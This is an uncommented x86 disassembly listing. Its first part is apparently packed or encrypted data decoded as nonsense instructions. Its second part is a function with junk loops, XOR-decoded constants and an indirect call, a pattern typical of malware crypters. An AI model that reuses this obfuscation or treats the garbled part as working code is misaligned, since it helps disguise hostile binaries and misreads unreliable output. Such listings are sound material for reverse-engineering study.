  414b48:	add    ebx,DWORD PTR [ebx+esi*2+0x438c445b]
  414b4f:	pop    edi
  414b50:	mov    eax,0xc8caaff3
  414b55:	mov    ebp,?
  414b57:	fild   DWORD PTR ds:0x73b9ba12
  414b5d:	dec    ecx
  414b5e:	data16 in al,0x33
  414b61:	outs   dx,BYTE PTR ds:[esi]
  414b62:	nop
  414b63:	std    
  414b64:	loop   0x414b43
  414b66:	cld    
  414b67:	dec    eax
  414b68:	and    ecx,eax
  414b6a:	add    DWORD PTR [edi+0x4d1bfb50],ecx
  414b70:	add    al,0x15
  414b72:	(bad)  
  414b73:	cmp    DWORD PTR [edi],eax
  414b75:	movzx  edi,WORD PTR [ebx+0x34]
  414b79:	imul   edx,DWORD PTR [ebx-0x25],0xb711b767
  414b80:	mov    edx,0xe25719c6
  414b85:	mov    bh,0x2c
  414b87:	and    dl,BYTE PTR [ebx+edx*1-0x69]
  414b8b:	ficom  DWORD PTR [eax+eax*1]
  414b8e:	adc    al,0x83
  414b90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b91:	mov    ah,0xfe
  414b93:	push   0x6c
  414b95:	leave  
  414b96:	loop   0x414bcb
  414b98:	rol    BYTE PTR [ebx],1
  414b9a:	ror    DWORD PTR [edi],1
  414b9c:	scas   eax,DWORD PTR es:[edi]
  414b9d:	sar    DWORD PTR [ebx],cl
  414b9f:	xlat   BYTE PTR ds:[ebx]
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	push   edi
  414bb2:	dec    ebp
  414bb3:	jb     0x414bf3
  414bb5:	adc    BYTE PTR [edx],0x7f
  414bb8:	js     0x414b9f
  414bba:	jle    0x414c34
  414bbc:	js     0x414b85
  414bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bbf:	cmp    al,BYTE PTR [edx]
  414bc1:	neg    al
  414bc3:	jp     0x414be9
  414bc5:	mov    ebx,0x7ebafecc
  414bca:	sbb    eax,0xa8d1f981
  414bcf:	sbb    eax,0xe7c459c8
  414bd4:	mov    esp,DWORD PTR [edx]
  414bd6:	and    eax,0x8f6871ae
  414bdb:	pusha  
  414bdc:	add    DWORD PTR [ecx+ebp*4],edi
  414bdf:	mov    DWORD PTR [ebx+0x5a694f56],esi
  414be5:	or     edi,DWORD PTR [ebx-0x359d631]
  414beb:	dec    edi
  414bec:	mov    ah,0x32
  414bee:	cs icebp 
  414bf0:	dec    ecx
  414bf1:	push   edx
  414bf2:	lahf   
  414bf3:	pop    ds
  414bf4:	(bad)  
  414bf5:	mov    ebx,0xb50d4bd9
  414bfa:	retf   0xc1c8
  414bfd:	push   esi
  414bfe:	shr    DWORD PTR [ebp-0xc0825c1],1
  414c04:	int3   
  414c05:	jge    0x414c5d
  414c07:	push   ds
  414c08:	pusha  
  414c09:	xchg   BYTE PTR [esp+edi*1-0x451cea99],dh
  414c10:	stc    
  414c11:	ret    0xf68b
  414c14:	retf   0x8b
  414c17:	xchg   ebx,eax
  414c18:	call   0x935:0x6ca95448
  414c1f:	not    BYTE PTR [edi+0x3904654c]
  414c25:	arpl   WORD PTR [edx+0x67cc92ca],cx
  414c2b:	aas    
  414c2c:	push   ebx
  414c2d:	jae    0x414bce
  414c2f:	(bad)  
  414c30:	leave  
  414c31:	mov    dl,0x15
  414c33:	mov    DWORD PTR [eax+0x3f85bda2],edx
  414c39:	mov    bl,0xdf
  414c3b:	out    0xd7,eax
  414c3d:	dec    ebx
  414c3e:	scas   eax,DWORD PTR es:[edi]
  414c3f:	jmp    FWORD PTR [ebx-0x398fde47]
  414c45:	cmp    al,0x87
  414c47:	mov    bl,BYTE PTR [edi-0x77]
  414c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c4b:	cmp    dh,BYTE PTR ds:0xabdbfa9c
  414c51:	xor    DWORD PTR [ebx-0x79],edi
  414c54:	pop    ebx
  414c55:	jle    0x414c74
  414c57:	gs dec edx
  414c59:	(bad)  
  414c5a:	xor    eax,0xa6d956d8
  414c5f:	add    bh,BYTE PTR [eax]
  414c61:	aaa    
  414c62:	pop    esi
  414c63:	lock test DWORD PTR [ebx-0x5c1ffcac],esi
  414c6a:	cmp    al,0xd2
  414c6c:	pushf  
  414c6d:	xor    DWORD PTR [ecx+0x7864071e],0x39
  414c74:	xor    DWORD PTR [ebp+0x31],edi
  414c77:	repz xchg ebp,eax
  414c79:	mov    ch,0x46
  414c7b:	(bad)  
  414c7c:	adc    al,0x55
  414c7e:	popf   
  414c7f:	jnp    0x414c1b
  414c81:	mov    ebx,0xb4b218e0
  414c86:	scas   al,BYTE PTR es:[edi]
  414c87:	scas   al,BYTE PTR es:[edi]
  414c88:	das    
  414c89:	sahf   
  414c8a:	add    eax,DWORD PTR [ebp+0x44f2e97e]
  414c90:	mov    ah,0xf0
  414c92:	rcr    BYTE PTR [edx-0x63],1
  414c95:	retf   0xb650
  414c98:	fcmovne st,st(2)
  414c9a:	push   0x144151a8
  414c9f:	imul   eax,DWORD PTR [ebp+0x32],0x2a
  414ca3:	neg    DWORD PTR [ebp-0x3c]
  414ca6:	popf   
  414ca7:	aaa    
  414ca8:	cdq    
  414ca9:	mov    dh,0x37
  414cab:	adc    eax,0x2fd62161
  414cb0:	mov    esi,ebp
  414cb2:	jno    0x414d06
  414cb4:	pushf  
  414cb5:	and    edx,eax
  414cb7:	pusha  
  414cb8:	xchg   esp,eax
  414cb9:	push   es
  414cba:	lods   eax,DWORD PTR ds:[esi]
  414cbb:	xchg   esi,eax
  414cbd:	mov    bl,bl
  414cbf:	push   ecx
  414cc0:	xchg   esp,eax
  414cc1:	jmp    0x414d16
  414cc3:	jle    0x414cb2
  414cc5:	cmp    al,0xa5
  414cc7:	pushf  
  414cc8:	stos   DWORD PTR es:[edi],eax
  414cc9:	adc    BYTE PTR [ebx],dl
  414ccb:	scas   eax,DWORD PTR es:[edi]
  414ccc:	dec    ebp
  414ccd:	stc    
  414cce:	mov    cl,0xf4
  414cd0:	inc    esp
  414cd1:	inc    esp
  414cd2:	(bad)  
  414cd3:	sar    DWORD PTR [esi],cl
  414cd5:	jg     0x414d08
  414cd7:	dec    ebp
  414cd8:	mov    ah,0x97
  414cda:	out    0xeb,al
  414cdc:	rol    esi,1
  414cde:	js     0x414d1c
  414ce0:	xlat   BYTE PTR ds:[ebx]
  414ce1:	push   0x37
  414ce3:	fcomp  DWORD PTR [ebx]
  414ce5:	sar    BYTE PTR [ecx-0x71],1
  414ce8:	stos   DWORD PTR es:[edi],eax
  414ce9:	add    BYTE PTR [edx],dl
  414ceb:	leave  
  414cec:	cmp    BYTE PTR [esi+0x35],dh
  414cef:	mov    ds,WORD PTR ds:0xd73a8dcb
  414cf5:	imul   ebx,DWORD PTR [eax+0x2e],0xcaeb0106
  414cfc:	mov    edx,0x9974802d
  414d01:	sti    
  414d02:	outs   dx,BYTE PTR ds:[si]
  414d04:	push   ebp
  414d05:	add    ebp,eax
  414d07:	xchg   ebx,eax
  414d08:	test   DWORD PTR [ebx-0x67dc4e14],ecx
  414d0e:	repnz loopne 0x414cf9
  414d11:	aas    
  414d12:	mov    bh,0x64
  414d14:	repnz ds inc eax
  414d17:	adc    BYTE PTR [esi],bl
  414d19:	nop
  414d1a:	or     ch,BYTE PTR [edx-0x9]
  414d1d:	je     0x414ca4
  414d1f:	jge    0x414d3f
  414d21:	enter  0x8fe8,0x67
  414d25:	pop    esp
  414d26:	fadd   DWORD PTR [esi+0x3ab011ce]
  414d2c:	xchg   ebp,eax
  414d2d:	mov    ds:0x977d457e,eax
  414d32:	and    BYTE PTR [ebx],bh
  414d34:	cmp    esi,ebp
  414d36:	shl    esp,1
  414d38:	mov    edx,edx
  414d3a:	jecxz  0x414d0a
  414d3c:	add    dl,ah
  414d3e:	adc    BYTE PTR [edx-0x29],cl
  414d41:	loop   0x414d3c
  414d43:	mov    edx,0xea9ac5e1
  414d48:	xor    DWORD PTR [edi],0xffffffed
  414d4b:	fsubr  st,st(3)
  414d4d:	loope  0x414ce7
  414d4f:	cmc    
  414d50:	xchg   ebp,eax
  414d51:	inc    eax
  414d52:	lods   eax,DWORD PTR ds:[esi]
  414d53:	jno    0x19458c77
  414d59:	(bad)  
  414d5a:	mov    ds:0xe3c63917,eax
  414d5f:	inc    esp
  414d60:	pushf  
  414d61:	ds sbb al,0x5b
  414d64:	mov    dl,0x9f
  414d66:	ret    
  414d67:	adc    ebp,DWORD PTR fs:[edi+edx*2]
  414d6b:	(bad)
  414d6e:	and    DWORD PTR [esi],esi
  414d70:	mov    bl,0x99
  414d72:	arpl   WORD PTR [ecx],cx
  414d74:	add    edx,DWORD PTR [edi]
  414d76:	and    eax,0x87c1dcfe
  414d7b:	in     al,dx
  414d7c:	pop    esi
  414d7d:	aaa    
  414d7e:	xor    eax,0x883b2fd2
  414d83:	hlt    
  414d84:	popf   
  414d85:	dec    ebp
  414d86:	cmp    ch,al
  414d88:	mov    esi,0xa42fd03a
  414d8d:	inc    edi
  414d8e:	fs push ds
  414d90:	arpl   si,si
  414d92:	leave  
  414d93:	rol    DWORD PTR [esi-0x48334826],1
  414d99:	and    al,0x59
  414d9b:	add    DWORD PTR [ecx],ebp
  414d9d:	cmp    al,cl
  414d9f:	jecxz  0x414d59
  414da1:	adc    bh,ch
  414da3:	clc    
  414da4:	lahf   
  414da5:	and    cl,BYTE PTR [esi-0x5c]
  414da8:	add    al,0x55
  414daa:	jl     0x414dc8
  414dac:	add    BYTE PTR [edx+0x21],0x8f
  414db0:	fisubr WORD PTR cs:[ebx+0x6f6aad23]
  414db7:	xchg   DWORD PTR [ebx-0x3b],ecx
  414dba:	xchg   ebp,eax
  414dbb:	cdq    
  414dbc:	imul   esp,ebx,0x8624d909
  414dc2:	outs   dx,DWORD PTR ds:[esi]
  414dc3:	fnstcw WORD PTR [ebp+0x19128d3d]
  414dc9:	or     bl,cl
  414dcb:	cmp    cl,BYTE PTR [edi-0x4a]
  414dce:	mov    ecx,0x7e4da658
  414dd3:	and    BYTE PTR [edx+0x4d6908e1],0x10
  414dda:	cmp    eax,0x9a0fae7c
  414ddf:	pop    ebx
  414de0:	mov    ds:0xd9fdaefe,eax
  414de5:	ins    DWORD PTR es:[edi],dx
  414de6:	(bad)  
  414de7:	js     0x414da0
  414de9:	shl    BYTE PTR [edx+0x32d268d1],cl
  414def:	pop    ss
  414df0:	fmul   DWORD PTR [edx-0x77f1803b]
  414df6:	dec    esp
  414df7:	enter  0x3a7b,0x36
  414dfb:	and    ah,BYTE PTR [eax+0x9ef79b1]
  414e01:	inc    edi
  414e02:	sbb    al,0x4
  414e04:	add    al,0x6d
  414e06:	push   eax
  414e07:	mov    dh,0x7
  414e09:	(bad)  [edx+0x7e]
  414e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0d:	jge    0x414e61
  414e0f:	push   esp
  414e10:	or     al,0x64
  414e12:	bnd ret 
  414e14:	lods   eax,DWORD PTR ds:[esi]
  414e15:	mov    edi,0x2ca044dc
  414e1a:	sbb    DWORD PTR ds:0x5856d767,edi
  414e21:	mov    eax,0xd40b348f
  414e26:	fldl2t 
  414e28:	jbe    0x40fa94
  414e2e:	pop    ebx
  414e2f:	pop    edi
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a815
  414e44:	xor    DWORD PTR ds:0x42a791,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7d9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a861,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a861
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a861,eax
  414e70:	cmp    DWORD PTR ds:0x42a861,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a861,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a86d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a821
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a819,0x42a851
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a821,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a855,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a795
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a865,0x42a785
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7d1,0x42a861
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a821,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a789,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a81d,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a81d
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a81d,edi
  414f60:	cmp    DWORD PTR ds:0x42a81d,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a81d,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a829
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a81d,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a81d
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a81d,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7d5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7e9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a78d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a865,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a869,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7d9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a825,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a865,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a869,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a869
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a869,ecx
  415032:	cmp    DWORD PTR ds:0x42a869,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a869,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a891
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a811,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a8a5,0x42a7d5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7e1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7e5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a899,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a899
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a899,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a899,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a899,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a85d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a86d
  4150eb:	mov    DWORD PTR ds:0x42a85d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7d1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a811
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a895,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a895
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a895,ecx
  415120:	cmp    DWORD PTR ds:0x42a895,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a895,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a77d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a77d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a77d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a77d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a9bf
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a77d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a77d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a77d,ecx
  415190:	cmp    DWORD PTR ds:0x42a77d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a7a1
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7e1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7e1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7e1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7e1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7e1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7e1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7e1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7e1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7e9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7e9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7e9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7e9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7e9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a795
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7e9,0x42a8a1
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a891,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a861,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a859,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a785,0x42a89d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a85d,0x42a779
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7ed,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7ed
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7ed,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7ed,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7ed,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a869
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a7a1,0x10
  415329:	cmp    DWORD PTR ds:0x42a7a1,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a7a1,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a7a1,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a7a1
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a7a1,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a7a1
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a7a1,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a811,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a811
  415393:	inc    eax
  415394:	mov    ds:0x42a811,eax
  415399:	cmp    DWORD PTR ds:0x42a811,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a811,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a779
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7dd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a851,0x0
  4153ed:	mov    eax,ds:0x42a851
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a851,eax
  4153f8:	cmp    DWORD PTR ds:0x42a851,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a952
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a851,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a851
  41542b:	inc    eax
  41542c:	mov    ds:0x42a851,eax
  415431:	cmp    DWORD PTR ds:0x42a851,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a781,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a8ad,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a8ad,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a8ad,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a789
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a8ad,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a8ad
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a8ad,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a8ad
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a8ad,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7d9
  4154c7:	and    edx,DWORD PTR ds:0x42a86d
  4154cd:	mov    DWORD PTR ds:0x42a7d9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a7a1,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a855,0x42a811
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a855,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7e5,0x42a825
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a815,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a781,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7dd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7dd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7dd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7dd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a865
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7dd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a89d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a89d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a89d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a89d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a89d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
